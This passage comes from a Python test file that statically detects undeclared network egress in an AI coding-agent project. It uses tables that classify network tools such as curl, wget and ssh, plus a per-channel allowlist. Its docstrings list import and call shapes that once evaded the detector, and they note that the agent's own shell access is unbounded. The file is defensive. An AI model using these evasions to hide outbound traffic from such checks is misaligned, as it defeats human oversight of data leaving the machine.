"""Undeclared external egress fails the build. A module may open an external
connection only because a line in ``ALLOWLIST`` below says it may, and that line
names **what it talks to** and **what gates it**.

WHY AN ALLOWLIST, WHEN ``tests/test_egress_disclosure.py`` ALREADY EXISTS.
That test asks a different question — "is every module that reaches the network
named in ``docs/security.md`` §7?" — and its unit is the MODULE. Once a module
is cited anywhere in §7, every *further* channel it grows is free. That is not
hypothetical: ``integrations/__init__.py`` is cited in §7 for its Jira/Linear/
CircleCI health checks, and under that citation it grew ``gh auth status`` — an
ambient probe that shelled out to GitHub, on a default install, with **nothing
configured**, and was found by somebody timing the command (1700-2036 ms) rather
than by any test. Finding egress with a stopwatch is not a process.

So the unit here is the CHANNEL, not the module: ``integrations/__init__.py``
being allowed to speak ``httpx`` says nothing about it being allowed to speak
``gh``. And the default for a channel nobody has classified is **denied** — the
same inversion ``EXPORT_CLASSIFICATION.txt`` uses for file export, and for the
same reason: it is the only property that does not depend on remembering.

STATIC, NOT DYNAMIC — and this is a real trade, not a default.
A dynamic guard (patch ``socket``, run the suite, assert nothing external
connects) is *precise*: it distinguishes "opened a socket" from "could have".
It was rejected on three grounds:

  1. **It only sees what it executes.** The bug this exists to prevent fired on
     the path where GitHub was *un*configured — a path a test suite has no
     reason to walk. You cannot exercise a code path you do not know is there,
     and "egress nobody knew about" is the entire threat.
  2. **It cannot see the class that actually bit us.** ``gh auth status`` opens
     its socket in *another process*. A ``socket`` patch in the pytest process
     observes nothing at all. Every dynamic instrument that would catch it
     (seccomp, a network namespace, a firewall) is not portable to a developer
     laptop, and a guard developers cannot run is a guard that rots.
  3. **Failure would be a flake.** A dynamic net-deny turns every unrelated
     import that phones home into a red build in somebody else's PR, and the
     fix people reach for is ``-p no:egressguard``.

So this test asserts **capability**: this module, as written, can reach that
destination. It deliberately over-reports — ``ci/gitlab.py`` is charged with
``glab`` on every run, though ``ci.enabled`` is ``false`` by default and the
backend is never even constructed — and the allowlist's ``gate`` field is where
the "but when does it actually fire?" judgement is written down, in prose, by a
human, re-checkable against the code.
One part of that judgement IS machine-checked: an entry gated on a config key
must have that key off in ``DEFAULT_CONFIG`` (``test_config_gates_are_really_off``),
because "it only fires if you configure it" is exactly the claim #49 falsified.

WHAT THIS CANNOT SEE — and a warning about this list.

The first version of this file carried a list like the one below and called it
"stated here rather than discovered later". An independent review then refuted
it in two words: `import subprocess as _sp` made the whole exec detector
silent, because `_call_kind` compared against the literal name `subprocess`.
That alias occurs five times in `src/no_human` and was hiding, among other
things, a `git fetch origin` that runs on EVERY task attempt. Seven more
shapes went with it: `from os import system`, `os.execvp`, `os.posix_spawn`,
a `Popen` subclass, a dict-dispatched runner, `getattr(httpx, "post")`, and
`asyncio.to_thread(subprocess.run, argv)` — the exec callable passed as an
ARGUMENT rather than called.

So: **a limitations list documents the boundaries its author thought of. It is
not evidence of completeness, and this one was materially wrong.** Everything
below is a boundary. None of it is a promise. The `EVASIONS` corpus at the
bottom of this file is the part that is actually checked, and it exists because
somebody attacked this and won.

The boundaries, as currently understood:

  * **The coder agent's own Bash.** The backend runs with
    `permission_mode="bypassPermissions"` and no tool allowlist. A `curl` an
    agent decides to run passes through no code this file parses. That traffic
    is unbounded and no static check bounds it. `docs/security.md` §7 says so
    in the same words.
  * **Dependencies.** `httpx`, the Agent SDK, Electron and everything in
    `uv.lock` open their own sockets. This reads *our* `src/no_human` only —
    not `scripts/`, not `desktop/` (JavaScript), not the `web/` bundle.
  * **Whether a connection is ever actually made.** This is a capability
    assertion. An allowlisted channel behind a branch that is never taken still
    reads as present, and a channel present but dead still needs its line here.
  * **Where a URL points at runtime.** `ci.base_url`, a webhook URL and
    `team_brain.control_plane_url` are operator-supplied strings. The guard
    knows a module can send; it cannot know to whom. The same limit applies to
    every `loopback:` gate: `server.host` defaults to 127.0.0.1 and can be set
    to 0.0.0.0.
  * **A program resolved from a runtime string.** `subprocess.run(shlex.split(s))`
    resolves to `<dynamic>`, which still demands an allowlist line — but the
    line cannot name the program, because nothing static can.
  * **A helper called from another module.** Argv is resolved through exec
    helpers *within one file*. `from .helpers import run_cmd; run_cmd([...])`
    resolves to nothing at the CALL site. It is not lost — the helper's own
    module reports `<dynamic>` at its definition, because a sink with no
    in-file caller is charged rather than dropped — but the program name is
    attributed to the wrong module.
  * **Who CAUSES the traffic, as opposed to who contains the call.** A channel
    is charged to the module the call is written in. `blockers/wake.py` runs on
    every scheduler tick (`core/scheduler.py:311-316`) and can reach
    `gh pr view --json mergeable` — but through a callable handed to it
    (`default_pr_mergeable` in `vcs/pr_watcher.py:507`), so it holds no channel
    of its own and appears nowhere in `ALLOWLIST`. Reading this list as "which
    module makes the machine talk" is a misreading; it is "which module
    contains the code that talks".
  * **A first-party module that is itself the transport.** `INERT_IMPORTS`
    classifies `no_human` as inert, so `from ..vcs.git import GitRepo` charges
    nothing. That is correct — the channel is charged inside `vcs/git.py` — but
    it means an import graph is never the evidence here.

"""

from __future__ import annotations

import ast
import re
from dataclasses import dataclass
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
PKG = REPO / "src" / "no_human"


# ---------------------------------------------------------------------------
# Reach: what a channel can touch.
#
# There is deliberately no LOOPBACK *reach*. An earlier draft had one and never
# returned it: nothing static can tell an `httpx` pointed at 127.0.0.1 from one
# pointed anywhere else, so a third reach value would have been a constant that
# only ever read as documentation for a mechanism that did not exist. Loopback
# is expressed where it is actually decidable — as a `loopback:` GATE on an
# allowlist line, cross-checked by test_loopback_entries_really_bind_loopback.
# ---------------------------------------------------------------------------

LOCAL = "local"        # cannot leave the machine
EXTERNAL = "external"  # egress: needs an allowlist line


# ---------------------------------------------------------------------------
# Imports. THIS HALF USED TO FAIL OPEN, and that was the defect that mattered
# most: `PROGRAMS` treated an unknown *binary* as EXTERNAL, but an unknown
# *Python module* was invisible, so `urllib3`, `xmlrpc.client`, `imaplib`,
# `slack_sdk` and `claude_agent_sdk` all scanned clean. The prompts-to-Anthropic
# channel — the FIRST line of docs/security.md §7 — was not detected at all.
#
# Now both halves are inverted the same way. A module is silent only because a
# line below says it is. Everything else is a channel.
# ---------------------------------------------------------------------------

#: Modules that open or accept a connection. Key on the most specific form:
#: `urllib.request` is here and `urllib` is not, because `urllib.parse` is
#: string munging and 11 modules in this tree import it. A rule keyed on the
#: `urllib` root would charge all 11 with egress, and a guard with 11 false
#: positives is a guard somebody deletes.
NET_IMPORTS: dict[str, str] = {
    # -- stdlib
    "urllib.request": "http:urllib.request",
    "http.client": "http:http.client",
    "http.server": "sock:http.server",
    "socket": "sock:socket",
    "socketserver": "sock:socketserver",
    "ssl": "sock:ssl",
    "ftplib": "sock:ftplib",
    "smtplib": "sock:smtplib",
    "poplib": "sock:poplib",
    "imaplib": "sock:imaplib",
    "nntplib": "sock:nntplib",
    "telnetlib": "sock:telnetlib",
    "xmlrpc.client": "http:xmlrpc.client",
    "webbrowser": "http:webbrowser",   # hands a URL to the user's browser
    # Not a socket itself, but it can load ANY library — including one that
    # opens sockets — so it is charged as a channel and each use needs an
    # allowlist line naming which DLL and why (kernel32, for `nh stop`).
    "ctypes": "pkg:ctypes",
    # -- third party
    "httpx": "http:httpx",
    "requests": "http:requests",
    "aiohttp": "http:aiohttp",
    "websockets": "http:websockets",
    "urllib3": "http:urllib3",
    "paramiko": "sock:paramiko",
    "claude_agent_sdk": "sdk:claude_agent_sdk",
    "anthropic": "sdk:anthropic",
    "openai": "sdk:openai",
    "slack_sdk": "sdk:slack_sdk",
    "playwright": "sdk:playwright",
    "mcp": "sdk:mcp",
    "fastapi": "sock:fastapi",
    "starlette": "sock:starlette",
    "uvicorn": "sock:uvicorn",
}

#: Roots verified NOT to open or accept a connection. This list is the whole
#: reason the default can be "channel": without it every `import json` would
#: demand an allowlist line. Adding a root here is the same kind of act as
#: adding one to PROGRAMS as LOCAL — a judgement somebody can be asked about —
#: and test_every_imported_root_is_classified fails on a root in neither list,
#: so a new `import imaplib` cannot arrive silently.
INERT_IMPORTS: frozenset[str] = frozenset({
    # stdlib: pure computation, filesystem, process, or text
    "__future__", "abc", "argparse", "ast",
    # registers callables to run at interpreter shutdown; opens and accepts
    # nothing, and the callable it registers here (shutil.rmtree) is itself
    # classified.
    "atexit",
    "base64", "bisect", "collections",
    "concurrent", "contextlib", "contextvars", "copy", "csv", "dataclasses",
    "datetime", "decimal", "difflib", "enum", "errno", "fcntl", "fnmatch",
    "functools", "getpass", "glob", "gzip", "hashlib", "heapq", "hmac", "html",
    "importlib", "inspect", "io", "ipaddress", "itertools", "json", "logging", "math",
    "mimetypes", "operator", "os", "pathlib", "pickle", "platform", "posixpath",
    "pprint",
    "queue", "random", "re", "readline", "secrets", "select", "shlex", "shutil",
    "signal", "site", "sqlite3", "stat", "statistics", "string", "struct",
    "subprocess", "sys", "sysconfig", "tarfile", "tempfile", "termios",
    "textwrap", "threading", "time", "tomllib", "traceback", "types", "typing",
    "unicodedata", "unittest", "uuid", "warnings", "weakref", "zipfile",
    "zlib",
    # reads bundled/system tzdata off disk to resolve IANA zone names; opens
    # and accepts nothing.
    "zoneinfo",
    # `asyncio` and `pty` are inert as IMPORTS; their networking entry points
    # (open_connection/start_server) and their exec entry points are matched on
    # the CALL instead, so `import asyncio` alone charges nothing. Same reason
    # `os` and `subprocess` are on this list rather than in NET_IMPORTS.
    "asyncio", "pty",
    # `urllib` and `http` are packages whose network submodules are keyed
    # above; the bare root is a namespace.
    "urllib", "http",
    # third party: no sockets of their own in the way this tree uses them
    "yaml", "rich", "textual", "click", "pydantic", "psutil", "aiosqlite",
    "pytest", "typer",
    # first party
    "no_human",
})

#: Attributes of a network module that CANNOT open a connection: exception
#: classes, value objects, and the transport base classes the tests subclass to
#: build doubles. Anything else on the module is treated as a request — the
#: allowlist inversion again, so a new `httpx` verb needs no code change here to
#: be caught. `api/app.py` imports `httpx` solely to catch `httpx.HTTPError`
#: raised by the clients it calls; charging it with egress would put a module
#: that makes no request onto the disclosure page.
#:
#: A module WITHOUT an entry here is charged at its import line — there is no
#: inert way to import `slack_sdk`.
INERT_ATTRS: dict[str, frozenset[str]] = {
    "httpx": frozenset({
        "HTTPError", "RequestError", "HTTPStatusError", "TimeoutException",
        "ConnectError", "ConnectTimeout", "ReadTimeout", "Response", "Request",
        "Timeout", "Limits", "URL", "codes", "BaseTransport",
        "AsyncBaseTransport", "MockTransport",
    }),
    "requests": frozenset({"RequestException", "HTTPError", "Timeout", "Response"}),
    "urllib.request": frozenset(),
    "http.client": frozenset({"HTTPException", "responses"}),
    "aiohttp": frozenset({"ClientError", "ClientTimeout"}),
    "websockets": frozenset({"WebSocketException"}),
    "socket": frozenset({"gaierror", "timeout", "AF_INET", "SOCK_STREAM", "error"}),
    "ftplib": frozenset({"error_perm"}),
    "smtplib": frozenset({"SMTPException"}),
    "paramiko": frozenset({"SSHException"}),
}


def classify_import(dotted: str) -> str | None:
    """Channel for an imported module, or None if it is classified inert.

    An unclassified module returns a channel — fail closed.
    """
    if not dotted:
        return None
    parts = dotted.split(".")
    for depth in range(len(parts), 0, -1):
        prefix = ".".join(parts[:depth])
        if prefix in NET_IMPORTS:
            return NET_IMPORTS[prefix]
        if prefix in INERT_IMPORTS:
            return None
    return f"pkg:{parts[0]}"


#: What a program is. The default for a program NOT in this table is EXTERNAL:
#: a tool nobody has classified is assumed to reach the network. Each line is a
#: judgement about a specific binary, re-checkable, not a pattern.
PROGRAMS: dict[str, tuple[str, str]] = {
    "git": (LOCAL, "dispatches on the subcommand — see GIT_SUBCOMMANDS"),
    # Local tools: each reads or writes this machine and nothing else.
    "ruff": (LOCAL, "linter; reads files, writes stdout"),
    "grep": (LOCAL, "reads files"),
    "cp": (LOCAL, "copies files"),
    "pkill": (LOCAL, "signals local processes by pattern"),
    "ps": (LOCAL, "reads local process metadata (start time, for the "
           "pool-lease pid-reuse check) — no network"),
    "taskkill": (LOCAL, "the Windows pkill/kill: terminates local processes "
                 "by PID (/T takes the tree); no network reach"),
    # Network tools. These lines are documentation, not permission — the
    # default is EXTERNAL anyway, so removing one changes nothing. They exist
    # so the table reads as a whole rather than as a list of exceptions.
    "gh": (EXTERNAL, "GitHub CLI; every subcommand but `--help` is an API call"),
    "glab": (EXTERNAL, "GitLab CLI; same"),
    "curl": (EXTERNAL, "arbitrary HTTP"),
    "wget": (EXTERNAL, "arbitrary HTTP"),
    "kubectl": (EXTERNAL, "talks to a cluster API server over the network"),
    "ssh": (EXTERNAL, "remote shell"),
    "scp": (EXTERNAL, "remote copy"),
    "rsync": (EXTERNAL, "can take a remote spec"),
    "pip": (EXTERNAL, "resolves against an index"),
    "uv": (EXTERNAL, "resolves against an index"),
    "npm": (EXTERNAL, "resolves against a registry"),
    "npx": (EXTERNAL, "fetches the package if absent"),
    "docker": (EXTERNAL, "pulls images"),
    "claude": (EXTERNAL, "the Agent SDK CLI — prompts to Anthropic"),
}

#: git dispatches on its subcommand, and this is the distinction the audit
#: turned on: `git status` is not egress, `git fetch` is. Default for an
#: unlisted subcommand is EXTERNAL — `git request-pull` fails closed.
#: Only LOCAL rows that some call site really uses may stay (see
#: test_no_unused_local_classifications): an unused LOCAL row is a pass
#: pre-authorised for code nobody has read.
GIT_SUBCOMMANDS: dict[str, tuple[str, str]] = {
    "status": (LOCAL, "reads the index"),
    "rev-parse": (LOCAL, "resolves a ref locally"),
    "rev-list": (LOCAL, "walks local history"),
    "log": (LOCAL, "reads local history"),
    "diff": (LOCAL, "compares local trees"),
    "show": (LOCAL, "reads a local object"),
    "cat-file": (LOCAL, "reads a local object"),
    "ls-files": (LOCAL, "reads the index"),
    "ls-tree": (LOCAL, "reads a local tree"),
    "for-each-ref": (LOCAL, "reads local refs"),
    "symbolic-ref": (LOCAL, "reads/writes HEAD"),
    "merge-base": (LOCAL, "walks local history"),
    "merge-tree": (LOCAL, "three-way merges two local commits; with "
                          "--write-tree it writes the result to the local "
                          "object store and prints its OID — no remote, no "
                          "worktree, no ref moved"),
    # LOCAL because the only call sites in this tree are `merge --squash
    # <local branch>` and `merge --abort` (vcs/approve_merge.py:361/:363) —
    # both operate on a ref already in the local object store, no remote
    # named. `git pull` (fetch + merge) stays EXTERNAL below; if `merge`
    # ever gains a remote-naming call site here, this row is wrong.
    "merge": (LOCAL, "merges a local ref into the worktree; contacts a "
                     "remote only via `pull`, which stays EXTERNAL"),
    # LOCAL because the only call sites in this tree are `rebase <local base>`
    # and `rebase --abort` (vcs/git.py's `rebase_onto`) — `<local base>` is
    # resolved by `resolve_commitish` before the call, to either a local
    # branch or an already-fetched `origin/<base>` tracking ref, never a bare
    # remote name; no round-trip happens here, only in whatever fetched that
    # tracking ref (`fetch`, which stays EXTERNAL below). If `rebase` ever
    # gains a call site that names a remote directly, this row is wrong.
    "rebase": (LOCAL, "replays local commits onto an already-resolved local "
                      "or tracking ref; contacts a remote only via `fetch`, "
                      "which stays EXTERNAL"),
    "grep": (LOCAL, "searches local tracked files / a local ref's tree; "
                    "reads the object store, never a remote"),
    "add": (LOCAL, "writes the index"),
    "commit": (LOCAL, "writes an object"),
    "checkout": (LOCAL, "writes the worktree"),
    "reset": (LOCAL, "moves a local ref"),
    "clean": (LOCAL, "deletes untracked files"),
    "init": (LOCAL, "creates a local repo"),
    "config": (LOCAL, "reads/writes a config file"),
    "worktree": (LOCAL, "manages local worktrees"),
    # `git remote add|get-url|-v` is local bookkeeping; `git remote update` is
    # a fetch. LOCAL because every call site in this tree is add/get-url, and
    # the argument-depth needed to separate them would not survive review. If
    # `remote update` ever appears here, this line is wrong.
    "remote": (LOCAL, "add/get-url only in this tree; `remote update` would be "
                      "a fetch and this classification would then be wrong"),
    # `git credential fill` consults local helpers (netrc, keychain, manager)
    # and does not dial out. `integrations._probe_gitlab_ambient` is built on
    # that being true — it is the ambient probe that was NOT the defect.
    "credential": (LOCAL, "consults local credential helpers; no round-trip"),
    # The network subcommands, named so the table reads as a whole.
    "fetch": (EXTERNAL, "contacts the remote"),
    "push": (EXTERNAL, "contacts the remote"),
    "pull": (EXTERNAL, "contacts the remote"),
    "clone": (EXTERNAL, "contacts the remote"),
    "ls-remote": (EXTERNAL, "contacts the remote"),
    "submodule": (EXTERNAL, "can clone"),
    "archive": (EXTERNAL, "can take a remote"),
}

#: argv that could not be resolved to a constant program. Fails closed.
DYNAMIC = "<dynamic>"


# ---------------------------------------------------------------------------
# The allowlist. talks_to names the destination; gate names what stops it.
# ---------------------------------------------------------------------------

_GATE_FORMS = ("default-on:", "user-invoked:", "config:", "env:", "loopback:")


@dataclass(frozen=True)
class Allowed:
    """One channel, one module, one reason.

    ``gate`` must start with one of ``_GATE_FORMS``. That is not decoration:
    ``config:<dotted.key>`` is verified against ``DEFAULT_CONFIG`` by
    ``test_config_gates_are_really_off``, so "it only fires if you configure it"
    is a checked claim rather than a comforting one.
    """

    talks_to: str
    gate: str

    def __post_init__(self) -> None:
        if not self.talks_to.strip():
            raise ValueError("talks_to is empty — an entry with no destination "
                             "is not an allowlist entry, it is a mute button")
        if not self.gate.startswith(_GATE_FORMS):
            raise ValueError(
                f"gate {self.gate!r} must start with one of {_GATE_FORMS}"
            )

    def _payload(self, prefix: str) -> list[str]:
        if not self.gate.startswith(prefix):
            return []
        head = self.gate[len(prefix):].split("—")[0].split(" — ")[0]
        return [p.strip() for p in head.split(",") if p.strip()]

    def config_keys(self) -> list[str]:
        """Dotted DEFAULT_CONFIG keys this channel is claimed to be gated on."""
        return self._payload("config:")

    def env_vars(self) -> list[str]:
        """``~/.no_human/.env`` names this channel is claimed to be gated on."""
        return self._payload("env:")


_ON = "default-on: "
_CFG = "config: "


# The list itself. Read it as the answer to "what can leave this machine, and
# what has to be true first?". 48 lines for 35 modules; every line was written
# by reading the call site named in it.
ALLOWLIST: dict[str, dict[str, Allowed]] = {

    # -- Not egress at all: no_human's own API on 127.0.0.1 -----------------
    # These need a line because no static rule can tell an `httpx` pointed at
    # 127.0.0.1 from one pointed anywhere else. The gate names the address, and
    # test_loopback_entries_really_bind_loopback checks the module says so.
    "cli/api_client.py": {
        "http:httpx": Allowed("no_human's own API", "loopback: 127.0.0.1:8420 "
                              "(DEFAULT_BASE_URL) — the CLI calling our server"),
    },
    # Split out of cli/commands.py, which keeps its own urllib line for
    # `_server_owns_worker` / `_post_server_cancel`. Same destination, same
    # gate: one GET of our own queue-health endpoint, for `nh status`.
    "cli/pool_probe.py": {
        "http:urllib.request": Allowed(
            "no_human's own API", "loopback: http://{server.host}:{server.port}"
            "/api/queue/health, server.host defaults to 127.0.0.1"),
    },
    "intake/mcp_bridge.py": {
        "http:httpx": Allowed("no_human's own API",
                              "loopback: http://{server.host}:{server.port} "
                              "(BASE_URL), server.host defaults to 127.0.0.1 "
                              "— the MCP bridge calling our server"),
        "sdk:mcp": Allowed(
            "the MCP client that launched this bridge — MCPServer's default "
            "transport is stdio, so the 'connection' is the pipe your editor "
            "already opened",
            "loopback: BASE_URL is {server.host}:{server.port}, 127.0.0.1:8420 "
            "by default; the bridge dials nothing else"),
    },
    "api/local_boundary.py": {
        "sock:fastapi": Allowed(
            "nobody — the Request/HTTPException/JSONResponse types the loopback "
            "boundary is written against; the module opens no socket, it refuses "
            "requests whose Host/Origin is not 127.0.0.1, localhost or ::1",
            "loopback: the boundary itself — every non-loopback Host is a 400"),
    },
    "api/app.py": {
        "sock:fastapi": Allowed(
            "nobody — FastAPI/Starlette ACCEPT connections, they do not make "
            "them. Charged because a listening socket is still a socket",
            "loopback: served on server.host, default 127.0.0.1"),
        "sock:starlette": Allowed(
            "nobody — the ASGI layer underneath FastAPI",
            "loopback: served on server.host, default 127.0.0.1"),
        "exec:pkill": Allowed(
            "nothing off this machine — signals local processes matching the "
            "task id (:1013, refused for ids under 12 chars)",
            "loopback: local process control only"),
        # The Windows half of the same cancel path. PowerShell could reach the
        # network in general, which is why it is not in PROGRAMS as LOCAL; this
        # call site runs a fixed Get-CimInstance template over Win32_Process
        # command lines, with the task id refused (not escaped) unless it is
        # [A-Za-z0-9_-]+, and feeds the PIDs to taskkill.
        "exec:powershell": Allowed(
            "nothing off this machine — enumerates local process command "
            "lines to find a cancelled task's children "
            "(`_windows_kill_by_cmdline`)",
            _ON + "task cancel, on Windows only; the POSIX path is pkill"),
    },
    "brain/credentials.py": {
        "sock:http.server": Allowed(
            "nobody — a one-shot server that ACCEPTS the OAuth redirect",
            "loopback: HTTPServer((\"127.0.0.1\", LOOPBACK_PORT)) at :271"),
    },
    "history/extractor.py": {
        "http:urllib.request": Allowed(
            "a language server on this machine",
            "loopback: host defaults to 127.0.0.1; transcript-research reader"),
    },
    # The channel is `<dynamic>` because argv is assembled at runtime: the
    # binary is `icacls`, resolved by shutil.which in `_run_icacls` (:174),
    # called at :213/:226 to replace and then read back the credential file's
    # ACL. Windows only — the POSIX path is os.chmod and spawns nothing.
    "config.py": {
        "exec:<dynamic>": Allowed(
            "nothing off this machine — `icacls` rewrites the credential "
            "file's ACL to owner-only and reads it back (fail-closed; a "
            "readback listing anyone else raises CredentialPermissionError)",
            _ON + "every credential-file write, on Windows only; there is no "
            "key that stops it because an unrestricted credential is worse"),
        # ctypes is charged as a channel because in general it can name any
        # DLL; this module loads exactly kernel32, for GetProcessTimes — the
        # pool-lease pid-reuse start-token read (`_win_start_token_from_
        # kernel32` / `_windows_start_token`) — and for OpenProcess /
        # GetExitCodeProcess — the liveness probe that replaces the
        # `os.kill(pid, 0)` idiom, which on Windows TERMINATES the probed
        # process instead of testing it (`_windows_pid_alive`, moved here
        # from cli/commands.py to sit next to `pid_alive`, one source of
        # truth for `_kernel32`/`_windows_pid_alive`).
        "pkg:ctypes": Allowed(
            "nothing off this machine — kernel32 process-creation-time query "
            "for the scheduler pool-lease start token (`process_start_token`) "
            "and kernel32 process-liveness queries for the instance lock and "
            "`nh stop` (`_windows_pid_alive`)",
            _ON + "every same-pid lease comparison, and the pidfile lock "
            "check and `nh stop`, on Windows only; the POSIX paths read "
            "/proc or shell out to `ps`, or keep os.kill(pid, 0)"),
    },
    "cli/commands.py": {
        "http:urllib.request": Allowed(
            "no_human's own API", "loopback: http://{server.host}:{server.port}"
            "/api/tasks, server.host defaults to 127.0.0.1"),
        # (The kernel32/ctypes liveness probe `_windows_pid_alive` moved OUT of
        # cli/commands.py into config.py — see config.py's pkg:ctypes entry
        # above; cli/commands.py now only imports the helper, so this module no
        # longer opens the ctypes channel and its stale entry was removed.)
        # `nh merge-stack run` is the operator's command. The agent is never
        # allowed to reach `gh pr merge` (constraint #2, docs/security.md §2).
        "exec:gh": Allowed("your GitHub host — `gh pr merge`",
                           "user-invoked: only from `nh merge-stack run`"),
        "sock:uvicorn": Allowed(
            "nobody — it BINDS a listening socket rather than dialling out",
            "loopback: `nh serve` binds server.host, which defaults to "
            "127.0.0.1; set it to 0.0.0.0 and the board is on your LAN"),
        "http:webbrowser": Allowed(
            "whatever host the opened URL points at — the user's own browser "
            "makes the request, not this process",
            "user-invoked: `nh board` / the login flow open a URL"),
        "exec:uv": Allowed(
            "PyPI, via `uv run pytest` — uv resolves and may download",
            "user-invoked: `nh test` only"),
        "exec:<dynamic>": Allowed(
            "whichever program `$EDITOR` names (`vi` if unset) — "
            "`_sp.run([editor, str(_cfg_path)])` at :1287",
            "user-invoked: `nh config edit` only"),
    },

    # -- On by default: prompts to Anthropic --------------------------------
    # The FIRST line of docs/security.md §7, and the largest channel in the
    # product — and the previous version of this file did not detect it at all,
    # because an unknown Python module was invisible while an unknown binary
    # was refused. Source files, diffs, test output and ticket text go out here.
    "agent/claude_backend.py": {
        "sdk:claude_agent_sdk": Allowed(
            "Anthropic, on your own credential (`llm.auth_mode`) — the coder "
            "session: source, diffs, test output, ticket text",
            _ON + "this is the point of the tool; there is no key that stops it"),
    },
    "agent/backend_check.py": {
        "sdk:claude_agent_sdk": Allowed(
            "Anthropic — a probe that the backend is reachable and authorised",
            _ON + "runs from `nh doctor` and at task start"),
    },

    # -- Off unless you switch backends: prompts to OpenAI -------------------
    # The SECOND coding backend. Same payload as the Claude line above (source,
    # diffs, test output, ticket text) to a different vendor, and it exists
    # only when the operator sets `worker.backend: codex` AND supplies their own
    # key. Both conditions are load-bearing: the backend REFUSES to start
    # without OPENAI_API_KEY rather than finding some other credential, because
    # BYO-API-key is the only sanctioned path — a deliberately conservative
    # choice under unresolved legal uncertainty, not a known prohibition (see
    # agent/codex_backend.py's module docstring).
    #
    # The channel is `<dynamic>` because argv is assembled at runtime — the
    # binary is `codex`, resolved by `find_codex_cli`.
    "agent/codex_backend.py": {
        "exec:<dynamic>": Allowed(
            "OpenAI, on your own API key, via the `codex` CLI — the coder "
            "session: source, diffs, test output, ticket text",
            "env: OPENAI_API_KEY — and only when worker.backend is 'codex'; "
            "the default is 'claude' and this module is never constructed"),
    },

    # -- On by default: the PR is the deliverable ---------------------------
    # There is no key that turns these off. docs/security.md §7 says so in the
    # same words; if that ever stops being true, this block is where it shows.
    "vcs/git.py": {
        "exec:git push": Allowed("your git remote — the task branch and its "
                                 "source", _ON + "a task's deliverable IS the "
                                 "PR; `never_push_to` chooses where, not whether"),
        "exec:git fetch": Allowed("your git remote — refs only",
                                  _ON + "PR/CI status polling while a task waits"),
        "exec:git ls-remote": Allowed(
            "your git remote — refs only; reads the branch's own remote tip, "
            "writes no ref",
            _ON + "classifying a non-fast-forward push rejection as BEHIND vs "
            "DIVERGED (remote_branch_relation) before choosing whether to "
            "force"),
    },
    # Its own module ON PURPOSE: the `<dynamic>` bucket is per-file, and
    # parking it on vcs/git.py would blind this gate to any future dynamic
    # exec added there (proven in review: a planted curl passed). Here the
    # bucket covers ~40 lines that spawn exactly one thing.
    "vcs/manifest_repair.py": {
        "exec:<dynamic>": Allowed(
            "the TARGET REPO's own `scripts/export_guard.py` (repo-controlled "
            "content), run in two shapes: PROACTIVELY as `[sys.executable, "
            "<repo>/scripts/export_guard.py, 'approve', '--all', '--prune']` "
            "before every commit attempt (300s timeout), and REACTIVELY as "
            "`[sys.executable, <repo>/scripts/export_guard.py, 'approve', "
            "<refused paths>]` — the manifest gate's documented FIX, inside "
            "the task worktree (120s timeout); the committed guard rewrites "
            "RELEASE_MANIFEST.txt pins and dials nothing",
            _ON + "the pipeline commit path — proactively on every commit, "
            "reactively on exactly the manifest gate's changed-pinned-files "
            "refusal (commit_with_manifest_repair, approve_pending_pins)"),
    },
    "vcs/github.py": {
        "exec:gh": Allowed("your GitHub host — PR create/read",
                           _ON + "open_pr terminates every task"),
    },
    "vcs/gitlab.py": {
        "exec:glab": Allowed("your GitLab host — MR create/read",
                             _ON + "open_pr terminates every task"),
    },
    "vcs/comment_poster.py": {
        "exec:gh": Allowed("your GitHub host — review comments quoting your code",
                           _ON + "reviewer findings are posted on the PR"),
        "exec:glab": Allowed("your GitLab host — review comments quoting your code",
                             _ON + "reviewer findings are posted on the MR"),
    },
    "vcs/pr_watcher.py": {
        "exec:gh": Allowed("your GitHub host — PR head SHA, checks, mergeability",
                           _ON + "polled while a task waits on CI or review"),
        "exec:glab": Allowed("your GitLab host — same",
                             _ON + "polled while a task waits on CI or review"),
        # The one channel here that is NOT the git host.
        "http:httpx": Allowed(
            "the CI server named in a check's details_url — fetches "
            "/consoleText with your SSO credentials",
            "env: SSO_USERNAME, SSO_PASSWORD — returns '' unless both are in "
            "~/.no_human/.env"),
    },
    "vcs/receipts.py": {
        "exec:gh": Allowed("your GitHub host — `gh pr view --json files,headRefOid`",
                           _ON + "the PR receipt is written when a PR is opened"),
        "exec:<dynamic>": Allowed(
            "whatever the caller's injected runner runs — `_default_runner` "
            "passes its argv straight through",
            _ON + "the injected runner is a test seam; the default path is the "
                  "`gh pr view` above"),
    },
    # `nh approve` merges the PR: a local squash commit as the operator
    # identity, then a push and PR close. Entered ONLY from `nh approve` / the
    # board's "Approve and merge" button (`land_task`) — never from an agent
    # session (constraint #2, docs/security.md §2). This is NOT `gh pr merge`
    # / `glab mr merge`: the merge itself is a local `git merge --squash`
    # (see the GIT_SUBCOMMANDS["merge"] row below), and gh/glab here only
    # read PR state and close the already-landed PR.
    "vcs/approve_merge.py": {
        "exec:git push": Allowed(
            "your git remote — the squashed merge commit, pushed to the "
            "default branch (`land_task`, :495)",
            "user-invoked: only from `nh approve` / the board's "
            "Approve-and-merge button"),
        "exec:git ls-remote": Allowed(
            "your git remote — refs only; reads back that the pushed ref "
            "landed (`land_task`, :504)",
            "user-invoked: only from `nh approve` / the board's "
            "Approve-and-merge button"),
        "exec:gh": Allowed(
            "your GitHub host — `pr view --json state` then `pr close` "
            "(`_close_pr`, :223/:236); closes the PR the squash landed. "
            "This is not `gh pr merge`",
            "user-invoked: only from `nh approve` / the board's "
            "Approve-and-merge button"),
        "exec:glab": Allowed(
            "your GitLab host — `mr view` then `mr close` (`_close_pr`, "
            ":201/:209); closes the MR the squash landed. This is not "
            "`glab mr merge`",
            "user-invoked: only from `nh approve` / the board's "
            "Approve-and-merge button"),
        # Per vcs/manifest_repair.py's precedent, the `<dynamic>` bucket is
        # per-file on purpose — parking it elsewhere would blind this gate to
        # a future dynamic exec added here.
        "exec:<dynamic>": Allowed(
            "`sys.executable` running the TARGET REPO's own "
            "`scripts/export_guard.py` (`approve`/`verify`, :389/:436) and "
            "`python -m pytest` over change-scoped tests (:459) — the "
            "repo's own test suite can dial anywhere; this process does not "
            "bound it",
            "user-invoked: only from `nh approve` / the board's "
            "Approve-and-merge button"),
    },
    "core/orchestrator.py": {
        "exec:gh": Allowed("your GitHub host — `gh api repos/…/pulls/<n>` for "
                           "the PR diff", _ON + "part of finalize/review"),
        "exec:glab": Allowed("your GitLab host — `glab api projects/…/changes`",
                             _ON + "part of finalize/review"),
        "sdk:claude_agent_sdk": Allowed(
            "Anthropic — subagent definitions wired into the coder session",
